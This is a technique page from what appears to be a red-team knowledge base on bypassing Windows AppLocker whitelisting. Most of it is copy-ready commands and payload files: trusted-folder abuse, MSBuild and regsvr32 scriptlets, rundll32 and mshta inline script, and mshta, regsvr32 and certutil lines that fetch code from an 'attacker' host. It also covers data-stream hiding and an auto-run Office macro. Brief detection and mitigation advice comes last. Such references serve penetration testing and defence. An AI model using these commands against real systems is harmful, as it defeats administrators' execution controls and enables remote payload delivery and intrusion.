---
title: AppLocker Bypass Techniques
category: techniques
tags: [evasion, applocker, whitelisting, bypass]
last_updated: 2025-12-27
---

# AppLocker Bypass Techniques

## What is AppLocker?

AppLocker is a Windows application whitelisting technology that allows administrators to control which applications and files users can run. It provides rules based on:

- **Publisher**: Digital signature of the software
- **Path**: File location
- **File Hash**: Cryptographic hash of the file

### AppLocker Rule Collections

| Collection | File Types |
|-----------|------------|
| Executable | .exe, .com |
| Windows Installer | .msi, .msp, .mst |
| Script | .ps1, .bat, .cmd, .vbs, .js |
| Packaged Apps | .appx |
| DLL | .dll, .ocx |

### Checking AppLocker Status

```powershell
# Get effective AppLocker policy
Get-AppLockerPolicy -Effective | Format-List

# Get specific rule collections
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections

# Check AppLocker service status
Get-Service AppIDSvc

# View AppLocker events
Get-WinEvent -LogName "Microsoft-Windows-AppLocker/EXE and DLL"
```

## Default Rules Weaknesses

When AppLocker uses default rules, several paths are whitelisted:

### Default Executable Rules

```
Allow Everyone: %PROGRAMFILES%\*
Allow Everyone: %WINDIR%\*
Allow BUILTIN\Administrators: *
```

### Writable Locations Within Trusted Paths

```
C:\Windows\Tasks
C:\Windows\Temp
C:\Windows\tracing
C:\Windows\Registration\CRMLog
C:\Windows\System32\FxsTmp
C:\Windows\System32\com\dmp
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\spool\PRINTERS
C:\Windows\System32\spool\SERVERS
C:\Windows\SysWOW64\FxsTmp
C:\Windows\SysWOW64\com\dmp
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
```

## Bypass Techniques

### 1. Trusted Folder Abuse

Copy executables to writable locations within trusted paths.

```cmd
# Copy payload to writable Windows directory
copy C:\Users\user\payload.exe C:\Windows\Tasks\payload.exe
C:\Windows\Tasks\payload.exe

# Using Temp directory
copy payload.exe C:\Windows\Temp\payload.exe
C:\Windows\Temp\payload.exe
```

**PowerShell:**

```powershell
# Find writable directories under Windows
$paths = @(
    "C:\Windows\Tasks",
    "C:\Windows\Temp",
    "C:\Windows\tracing",
    "C:\Windows\System32\spool\drivers\color"
)

foreach ($path in $paths) {
    try {
        $testFile = Join-Path $path "test.txt"
        [IO.File]::WriteAllText($testFile, "test")
        Remove-Item $testFile
        Write-Host "[+] Writable: $path" -ForegroundColor Green
    } catch {
        Write-Host "[-] Not writable: $path" -ForegroundColor Red
    }
}
```

### 2. LOLBAS (Living Off The Land Binaries)

Use legitimate Windows binaries to execute arbitrary code.

#### MSBuild

```cmd
# Execute C# code via MSBuild
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml
```

**payload.xml:**

```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Build">
    <ClassExample />
  </Target>
  <UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <ParameterGroup/>
    <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
          using System;
          using Microsoft.Build.Framework;
          using Microsoft.Build.Utilities;
          public class ClassExample : Task, ITask
          {
            public override bool Execute()
            {
              System.Diagnostics.Process.Start("cmd.exe", "/c calc.exe");
              return true;
            }
          }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

#### InstallUtil

```cmd
# Execute .NET assembly
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe
```

#### Rundll32

```cmd
# Execute JavaScript
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";document.write();h=new%20ActiveXObject("WScript.Shell").Run("calc.exe")

# Execute DLL export
rundll32.exe shell32.dll,Control_RunDLL payload.dll
```

#### Mshta

```cmd
# Execute HTA from URL
mshta http://attacker/payload.hta

# Inline VBScript
mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""calc.exe"":close")

# Inline JavaScript
mshta javascript:a=(GetObject("script:http://attacker/payload.sct"));close();
```

#### Regsvr32

```cmd
# Execute scriptlet from URL (Squiblydoo)
regsvr32 /s /n /u /i:http://attacker/payload.sct scrobj.dll
```

**payload.sct:**

```xml
<?XML version="1.0"?>
<scriptlet>
  <registration progid="ShortJSRAT" classid="{10001111-0000-0000-0000-0000FEEDACDC}">
    <script language="JScript">
      <![CDATA[
        var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
      ]]>
    </script>
  </registration>
</scriptlet>
```

#### CMSTP

```cmd
# Execute INF file
cmstp.exe /ni /s payload.inf
```

#### Certutil

```cmd
# Download and decode payload
certutil -urlcache -split -f http://attacker/payload.exe payload.exe
certutil -decode encoded.txt payload.exe
```

### 3. Alternate Data Streams (ADS)

Hide executables in alternate data streams.

```cmd
# Create ADS
type payload.exe > "C:\Windows\Tasks\legitimate.txt:payload.exe"

# Execute from ADS (older Windows)
wmic process call create "C:\Windows\Tasks\legitimate.txt:payload.exe"

# Using PowerShell
powershell -c "& {Start-Process 'C:\Windows\Tasks\legitimate.txt:payload.exe'}"
```

### 4. DLL-Based Execution

When DLL rules are not enforced (common misconfiguration).

```cmd
# Load DLL with rundll32
rundll32.exe payload.dll,EntryPoint

# Load DLL with regsvr32
regsvr32.exe /s payload.dll
```

### 5. Script-Based Bypasses

#### PowerShell Constrained Language Mode Bypass

```powershell
# Check language mode
$ExecutionContext.SessionState.LanguageMode

# Use PowerShell v2 if available
powershell.exe -Version 2

# Use alternative script hosts
cscript.exe //E:jscript payload.js
wscript.exe payload.vbs
```

#### Batch Script Alternatives

```cmd
# Using forfiles
forfiles /p c:\windows\system32 /m notepad.exe /c "calc.exe"

# Using pcalua (Program Compatibility Assistant)
pcalua.exe -a calc.exe
```

### 6. Microsoft Office Macros

If Office is allowed, macros can execute code.

```vba
Sub AutoOpen()
    Shell "cmd.exe /c calc.exe", vbHide
End Sub
```

### 7. Compiled HTML Help (CHM)

```cmd
# Create malicious CHM file and execute
hh.exe payload.chm
```

## Quick Reference - LOLBAS Commands

| Binary | Use Case | Example |
|--------|----------|---------|
| MSBuild.exe | Execute C# inline | `msbuild.exe payload.xml` |
| InstallUtil.exe | Execute .NET assembly | `installutil.exe /U payload.dll` |
| Rundll32.exe | Execute DLL/JS | `rundll32 javascript:...` |
| Mshta.exe | Execute HTA/VBS | `mshta vbscript:...` |
| Regsvr32.exe | Execute SCT | `regsvr32 /i:url scrobj.dll` |
| Cmstp.exe | Execute INF | `cmstp /ni /s payload.inf` |
| Certutil.exe | Download files | `certutil -urlcache -f url` |

## Detection and Monitoring

### Event IDs

| Event ID | Log | Description |
|----------|-----|-------------|
| 8003 | AppLocker/EXE and DLL | Executable blocked |
| 8004 | AppLocker/EXE and DLL | Executable allowed |
| 8006 | AppLocker/MSI and Script | Script blocked |
| 8007 | AppLocker/MSI and Script | Script allowed |

### Monitoring Recommendations

1. Monitor execution from writable Windows directories
2. Alert on LOLBAS binary usage with unusual parameters
3. Track certutil download operations
4. Monitor MSBuild/InstallUtil invocations

## Mitigation

1. **Enable DLL Rules**: Most bypasses involve DLL execution
2. **Block Writable Paths**: Add explicit deny rules for writable locations
3. **Restrict LOLBAS**: Create rules blocking abuse of system binaries
4. **Use WDAC**: Windows Defender Application Control is more robust

## References

- [LOLBAS Project](https://lolbas-project.github.io/)
- [Microsoft AppLocker Documentation](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview)
- [MITRE ATT&CK - System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218/)
